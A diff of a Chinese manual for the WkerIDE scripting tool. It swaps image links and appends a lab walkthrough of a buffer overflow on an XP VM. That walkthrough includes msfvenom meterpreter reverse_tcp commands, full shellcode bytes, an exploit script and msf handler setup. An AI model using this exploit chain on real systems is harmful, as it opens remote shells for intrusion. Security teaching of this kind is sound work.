@@ -43,13 +43,13 @@
 
 程序启动界面：
 
-![load](jpg/1.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332841.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 程序一启动会弹出一个检查版本信息的加载界面，这个界面不仅会加载各种支持库还有初始化GitHub信息，也会检测更新。
 
 程序启动之后就会出现如下的界面：
 
-![start](jpg/2.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331229.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 可以看到程序界面还算整洁。
 
@@ -91,7 +91,7 @@ function main(args)
 
 会在控制台输出： Wker is handsome !
 
-![example](jpg/3.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331239.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 看到输出说明环境是没有什么问题的。
 
@@ -126,10 +126,10 @@ function main(args)
 可以在main函数中使用args数组，例如：
 
 1. 设置args数组
-   - ![args](jpg/4.jpg)
+   - ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030814033124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 2. 打印args[0]
-   - ![pta](jpg/5.jpg)
+   - ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030814033232.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 在这里我们也可以看到每一次执行脚本的时候都会用一个`------------------------------------------------------`分割线进行分割的。
 
@@ -152,7 +152,7 @@ function main(args)
 
 我们定义了一个add函数，add函数显示print了一行字，然后返回了a+b的值，我们在主方法中打印了add(2,3)的值，最终程序的运行结果：
 
-![自定义函数](jpg/6.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331741.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 可以看到我们输出的结果和想象中的并不是完全一样，哪里不一样呢？我们应该输出5，但我们输出了5.0。这是因为Wker语言没有类别区分，为了兼容性所以全部的数值结算的结果都是小数，那么我们如何得到一个整数的结果呢？我们可以使用库函数：`ToInt`进行转换：
 
@@ -162,7 +162,7 @@ print(ToInt(add(2,3)));
 
 最终执行的结果：
 
-![res](jpg/7.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332859.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 这样子们的小数部分就不存在了。
 
@@ -185,7 +185,7 @@ Wker语言的数据形式有三种：
 
 可以使用`var`进行声明，也可以不进行声明直接进行赋值，例如：
 
-![novar](jpg/8.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331491.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 可以看到没有进行变量声明也是可以的。
 
@@ -195,7 +195,7 @@ Wker语言的数据形式有三种：
 
 可以用`array`进行声明，当然也可以不声明直接使用，例如：
 
-![array](jpg/9.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331598.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 可以看到我们使用ArrayAddEle函数向数组添加了一个值，最终将数组返回。
 
@@ -203,7 +203,7 @@ Wker语言的数据形式有三种：
 
 暂时来说对于用户无法直接声明一个对象，对象其实在Wker中是一个句柄，通过这个句柄可以操作特定的对象，例如在ObjectLibrary这个支持库中导出的HashMap系列函数，就是典型的例子：
 
-![obj](jpg/10.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331725.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 可以看出我们通过hashmap进行键值对的操作，但是有一点注意，我在开发支持库的时候我不小心将hash打成了hasp，哈哈，下次更新支持库的时候再说吧！
 
@@ -442,7 +442,7 @@ function main(args)
 
 这个针对于所有脚本的，我们可以通过打开：设置->全局变量进行设置：
 
-![g_var](jpg/11.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331315.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 让后我们执行下面这段代码：
 
@@ -459,7 +459,7 @@ function main(args)
 
 全局数组的定义是只有一种的，我们可以通过打开：设置->全局数组进行设置
 
-![g_array](jpg/12.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331729.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 然后我们执行下面这段代码：
 
@@ -486,7 +486,7 @@ function main(args)
 
 这个不是赋值，而是一个必须请求。在我们想要得到一个指定变量的时候使用，例如我现在要用户必须提供给我一个名称为url的一个变量，否则不可以运行，我们可以使用`#request url = var`，如果我们没有赋值url，然后运行了脚本，那么脚本解析器会提示：
 
-![request](jpg/13.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332354.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 这个在之后的批量运行时是十分重要的！
 
@@ -571,19 +571,19 @@ function main(args)
 
 输入您的账号名称，然后点击获取仓库：
 
-![war](jpg/14.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331401.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 我们选择刚才的仓库，我这里选择Demo，然后在下方输入您的Token，然后点击确定：
 
-![gitsure](jpg/15.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331480.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 然后我们就可以看到我们的GitHub仓库的文件了，这个时候我们就可以有点GitHub仓库中的项目进行下载，然后点击本地文件的项目进行上传更新到仓库：
 
-![upload](jpg/16.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332464.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 然后我们就可以到仓库中进行查看：
 
-![gwar](jpg/17.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331624.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 如果下载的话呢就右键点击下载的项目下载就好了，并且因为保存了信息，所以在之后每次打开Wker的时候都是会自动登录GitHub的。
 
@@ -619,19 +619,19 @@ Linux和macOS下也是修改host，这里过多赘述。
 
 最主要的更新是增加了批量执行脚本的功能，这个功能是勾选上你需要选择执行的脚本，然后选择运行中的运行所有选中脚本。
 
-![勾选](jpg/18.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332243.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 就可以批量执行了。
 
 双击脚本就可以看到脚本的源代码，然后运行就可以了：
 
-![script](jpg/19.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332342.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
-![run](jpg/20.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332375.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 但是漏洞探测的脚本需要注意的是，我们需要设置全局的url变量，因为：
 
-![url](jpg/21.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332425.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 ```js
 #request url = var
@@ -649,17 +649,17 @@ function main(args)
 
 因为我都是使用了#request要求IDE检查是否设置了url，只有在全局变量中设置了才可以。
 
-![tp](jpg/22.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332624.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 这次更新我也附带了104个脚本文件，里面各式各样的脚本都有（有一些是抄的），以后也会经常更新（关注官方源）。
 
-![test](jpg/23.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 当然误报是正常的，不能确定百分百的正确性，但是已经是很不错的了。
 
 并且修复了一个github的加载bug，之前加载中文路径错误（其实是我写的时候忘记URL编码了...）现在也进行了修复。
 
-![github](jpg/24.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332172.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 ## V1.22
 
@@ -794,7 +794,7 @@ usage: java -jar WkerIDE.jar -g
 
    首先我们想要做暴力破解我们就需要来分析这个网站的一个信息，首先我们先捕获账号密码提交的HTTP数据包：
 
-   ![post](jpg/25.jpg)
+   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332473.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
    是一个post封包：
 
@@ -892,7 +892,7 @@ usage: java -jar WkerIDE.jar -g
 
    最终我们将会得到下面的结果：
 
-   ![res](jpg/26.jpg)
+   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332691.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
    可以看到我们最终爆破成功了，验证码识别的并不是完全准确，但是准确率还是可以的。
    当然之后我会添加上需要人工智能的支持库，方便大家调用，并且还会推出许多渗透测试的函数出来！
@@ -946,7 +946,7 @@ tips：mysql是比较典型的注入，盲注也比较合适对脚本编写的�
 
 首先给大家先看一下文件结构：
 
-![file](C:/Users/a/Desktop/1.26/jpg/27.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331592.jpg#pic_center)
 
 1. SQLAttack.wker 脚本中保存着基本的注入方法
 2. MYSQLAttack.wker 脚本中保存着mysql注入的相关方法
@@ -1126,7 +1126,7 @@ function main(args)
 
 我们来看一下最后的执行结果：
 
-![res](C:/Users/a/Desktop/1.26/jpg/28.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332819.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 可以看到我们最终跑出了所有的数据库名称。
 
@@ -1428,7 +1428,7 @@ function TakeLength(url,sentence,length){
 
 让给我们看下最后的结果：
 
-![res](C:/Users/a/Desktop/1.26/jpg/29.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332821.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
 
 可以看到我们即使存在js也是可以注入成功的，这样增加了程序的灵活性
 
@@ -1686,4 +1686,133 @@ function main(args)
 
 看一下最终的执行结果：
 
-![res](jpg/30.jpg)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332854.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)
+
+## 缓冲区溢出
+首先我们先要系统是XP没有开启DEP（开启的话呢需要rop绕过会有些麻烦，这里不详细将如何绕过）
+如何检测你的虚拟机开没开DEP，首先我们打开我的电脑->属性：
+![](data/attachment/album/202103/06/010612rdc8ciyy3abc0pzt.jpg)
+如果那个noexecute=AlwaysOff的话呢说明这个DEP没有开启，系统是不会检测边界问题的，其实说白了就和我们当时玩XP内核用调试模式打开XP时候配置的boot.ini修改的位置一样，只不过我们这个时候是要更改noexecute这个属性。
+然后重启一下，我们还是运行我们调试的程序。
+这个时候我们要来做模糊测试了，首先我们的思路是这样子的，他既然没有检测我们的输入是否存在边界，那么我们就可以考虑，我们输入的内容会不会溢出到EIP这个寄存器呢？没错，这个就是我们想到的，那么我们如何检测呢？我们首先先用DBG附加我们的程序。
+这里我们不能用OD，因为OD会捕获这个EIP位置的异常，我们需要设置，但是我怕我这里说了，会有点偏离文章主题，所以我们用一个`Immunity Debugger`，这个会把这个异常反馈给我们，我们用这个调试器附加进程，这个方便之处他可以查看进程开发的端口，容易选择，选择开放8888这个端口的进程。
+我们先发送50个a给这个程序，看看这个程序会不会溢出。
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010615z9a0zj9sbfbnjoq3.jpg)
+发过去之后，我们立马过去看调试：
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010619m60edh9kddrk5v6f.jpg)
+这个时候程序pause了，可以看到EIP变成了4个61！那么为什么会变成61呢？想了一下，我们输入了a，它对应的十六进制的ASCII正好就是61！所以我们可以基本确定的是，我们输入的内容中的一部分被溢出到了EIP这个寄存器。
+那么我们下一步就是要来确定到底是哪个位置溢出的字符变成了EIP的值，所以我们这个时候就要来找，这个时候我们有两种思路：
+
+1. 使用二分法
+
+2. 使用特征字符
+    第一种就是比较基本的寻找，第二种就是输入50个不同的字符，然后看看是哪个位置的值覆盖了EIP。
+    第二种kali之前是带了可以生成的工具，但是我的kali不知道什么原因出错了，可能是Ruby的版本不同吧。
+    我就用二分法，也不是很难，就是在50个位置里面找一个位置，找个几次也就找出来了，这里的话呢我们最好用一个小脚本：
+
+  ```js
+  function main(args)
+  {
+          s = CreateTCPSocket("192.168.209.130",8888);
+          wb = TCPSocketRecv(s);
+          print(wb);
+          b = AddBytes(GetSomeBytes("144",16),GetSomeBytes("97",4));
+          TCPSocketSend(s,bw);
+          wb = TCPSocketRecv(s);
+          print(wb);
+          CloseTCPSocket(s);
+  }
+  ```
+
+  
+
+详细的函数说明请看函数介绍，很简单就是通过更改"B"字符乘的个数，来确定到底是第几个位置出现了，也就是到底是乘几才会让EIP变成4个“O”。
+最终发现16个B之后的连续四个字节会覆盖EIP。
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010621ny1z4g86oqcarjq1.jpg)
+到此为止我们就已经完成了一半，我们现在可以控制程序的EIP，那么问题来了，虽然我们可以控制程序的EIP，那么如何让他执行我们想要执行的代码呢？这是一个问题。
+这个时候我们多次尝试的过程中发现一个问题，当我们字符输入很多的时候，我们在四个“O”之后的内容会出现在栈中！这个意思就是说我们可以控制栈的内容：
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010624hkq8o9d16l5vj5vd.jpg)
+
+所以说溢出的结构是：
+
+——————————
+原始位置
+——————————
+EIP
+——————————
+栈
+——————————
+
+这个时候就可以想到，如果我们在栈中放入我们的恶意代码，然后让EIP的值等于ESP，那么就会在目标系统执行我们的木马。
+好了那么我们现在需要一段恶意代码，也就是能够在目标系统留一个后门程序的，那么我们如何得到呢？其实kali提供给我们了一个程序可以生成这么一段汇编代码，使用msfvenom这个程序进行生成。
+具体命令：`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows`
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010627uw8n8u923bk35668.jpg)
+可以看到生成了一个Python格式的字节但是我们注意，可以看到我们这里面存在一个00，这个显然不是我们要的，因为00是字符串的结束啊，所以我们不能有00这个字节，那么我们就需要告诉他我们排除00这个badchar。
+`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows -b 00`
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010629er6366akga20r3te.jpg)
+这个就是没有00了，那么我们可以改一下我们的代码：
+
+但是我们还是没有考虑到所有不被允许的字节，这里通过将所有字节传输过去（可以挨个试，但是一般是一次性发送到255），最终发现0d这个字节也是不被允许的，所以最终我们生成的shellcode应该这么写：`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows -b 00 0d`
+
+但是单纯的python的shellcode格式是不行的，我们需要转换成10进制，并且整理，最终整理的结果：
+
+`189,202,146,107,146,218,197,217,116,36,244,95,49,201,177,86,131,199,4,49,111,15,3,111,197,112,158,110,49,246,97,143,193,151,232,106,240,151,143,255,162,39,219,82,78,195,137,70,197,161,5,104,110,15,112,71,111,60,64,198,243,63,149,40,202,143,232,41,11,237,1,123,196,121,183,108,97,55,4,6,57,217,12,251,137,216,61,170,130,130,157,76,71,191,151,86,132,250,110,236,126,112,113,36,79,121,222,9,96,136,30,77,70,115,85,167,181,14,110,124,196,212,251,103,110,158,92,76,143,115,58,7,131,56,72,79,135,191,157,251,179,52,32,44,50,14,7,232,31,212,38,169,197,187,87,169,166,100,242,161,74,112,143,235,2,181,162,19,210,209,181,96,224,126,110,239,72,246,168,232,217,16,75,38,97,112,181,199,145,88,114,147,193,242,83,156,138,2,91,73,38,9,203,178,30,220,133,91,92,223,155,1,233,57,203,101,185,149,172,213,121,70,69,60,118,185,117,63,93,210,28,208,11,138,136,73,22,64,40,149,141,44,106,29,39,208,37,214,66,194,82,129,172,26,163,36,172,112,167,238,251,236,165,215,203,178,86,50,72,180,169,195,120,206,156,81,196,184,224,181,196,56,183,223,196,80,111,132,151,69,112,17,132,213,229,154,252,138,174,242,2,244,153,92,253,211,153,155,1,161,181,3,105,89,134,179,105,51,6,228,1,200,41,11,225,49,224,68,105,187,101,38,8,188,175,230,148,189,92,51,39,199,45,196,200,56,36,161,201,56,72,215,246,238,113,173,57,51,198,190,12,22,111,85,110,4,111,124`
+
+```javascript
+function main(args)
+{
+        s = CreateTCPSocket("192.168.209.130",8888);
+        wb = TCPSocketRecv(s);
+        print(wb);
+        b = AddBytes(GetSomeBytes("144",16),GetBytes("227,65,75,95"));
+        bt = AddBytes(b,GetSomeBytes("144",6));
+        bw = AddBytes(bt,GetBytes("189,202,146,107,146,218,197,217,116,36,244,95,49,201,177,86,131,199,4,49,111,15,3,111,197,112,158,110,49,246,97,143,193,151,232,106,240,151,143,255,162,39,219,82,78,195,137,70,197,161,5,104,110,15,112,71,111,60,64,198,243,63,149,40,202,143,232,41,11,237,1,123,196,121,183,108,97,55,4,6,57,217,12,251,137,216,61,170,130,130,157,76,71,191,151,86,132,250,110,236,126,112,113,36,79,121,222,9,96,136,30,77,70,115,85,167,181,14,110,124,196,212,251,103,110,158,92,76,143,115,58,7,131,56,72,79,135,191,157,251,179,52,32,44,50,14,7,232,31,212,38,169,197,187,87,169,166,100,242,161,74,112,143,235,2,181,162,19,210,209,181,96,224,126,110,239,72,246,168,232,217,16,75,38,97,112,181,199,145,88,114,147,193,242,83,156,138,2,91,73,38,9,203,178,30,220,133,91,92,223,155,1,233,57,203,101,185,149,172,213,121,70,69,60,118,185,117,63,93,210,28,208,11,138,136,73,22,64,40,149,141,44,106,29,39,208,37,214,66,194,82,129,172,26,163,36,172,112,167,238,251,236,165,215,203,178,86,50,72,180,169,195,120,206,156,81,196,184,224,181,196,56,183,223,196,80,111,132,151,69,112,17,132,213,229,154,252,138,174,242,2,244,153,92,253,211,153,155,1,161,181,3,105,89,134,179,105,51,6,228,1,200,41,11,225,49,224,68,105,187,101,38,8,188,175,230,148,189,92,51,39,199,45,196,200,56,36,161,201,56,72,215,246,238,113,173,57,51,198,190,12,22,111,85,110,4,111,124"));
+        TCPSocketSend(s,bw);
+        wb = TCPSocketRecv(s);
+        print(wb);
+        CloseTCPSocket(s);
+}
+```
+
+
+
+那么这个144是做什么的，其实就是怕不是第一个字符开始执行有点差错的话呢那么我们的程序就会终止，那么我们可以加几个NOP进行填充，这样保证我们的程序可以正确无误的执行。
+我们大部分的工作完成了，但是还存在一个问题，那个OOOO到底要写成什么，我们肯定不能写成ESP的地址，那么怎么办？这个时候我们只能间接的进行实现了。
+反正我们只要让EIP运行到ESP的位置，那么我们为什么不能找一个地址，这个地址存储的汇编代码是可以跳转到ESP的呢？
+例如：`jmp esp`,`ret`,`jnz/jz/je/jne esp`，寻找这个样子的代码，第一个明显是最简单的，第二个的话呢我们还是需要构造一下，好让他能返回到ESP，第三个的话呢我们还需要考虑标志寄存器的一个问题（其实还有好多，这里我就举了这几个）。
+所以我们现在就要找一个这个程序里面哪个地方存在`jmp esp`这条语句，我们只需要将OOOO设置为这个地址，然后EIP运行到这里的时候，然后他就会跳转到ESP。
+我们首先要确定我们找到的这个地址他是不会改变的地址（ASLR），第二就是这个地址里面不能存在00，第三就是这个地址没有被SEH链保护，第四还要这个地址要是系统的DLL。
+确定这一点之后，我们就要来查一下，这个DBG有个mona插件，可以网上下载，他支持查看：`!mona modules`:
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010632he6vv6ewlk9aq6vk.jpg)
+OD也有类似的插件。
+我们尽量保证除了OS DLL这个选项是true，其他的选项都是FALSE，我们最终发现了`SLMFC.dll`，那么我们就在这个DLL中寻找`jmp esp`。
+其实如果主程序的地址不是00开头的话呢应该也是可以用的，但是很可惜一般不太可能。
+那么我们来寻找一下，使用命令：`!mona find -s "\xff\xe4" -m "SLMFC.dll"`
+最后得到：
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010634vfnlnaaklfzfx6wl.jpg)
+`jmp esp`对应的就是ff e4。
+最后找到了这么多，随便选一个：`0x5f4b41e3`
+我们尝试一下，但是我们用的时候注意，我们这个地址是要能够执行的，如果不是的话呢要确保你的DEP是关闭的（上面说过了）。
+还需要注意的是，我们内存的存储方式，需要反过来，也就是说我们要这样写：`\xe3\x41\x4b\x5f`，当然也是需要转换成十进制。
+代码写好之后我们就需要配置我们的msf进行侦听：
+
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.209.138
+set LPORT 666
+exploit -j
+```
+
+最终我们的结果会是这个样子：
+
+![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010636uzvpkcalois60f66.jpg)
+
+最终我们成功的溢出了目标系统。
+
+## V1.27
+
+1. 增加了socket支持库
+2. 修复了其余目录加载问题
+3. 增加了n多脚本
+4. 增加了Windows的wker脚本默认执行
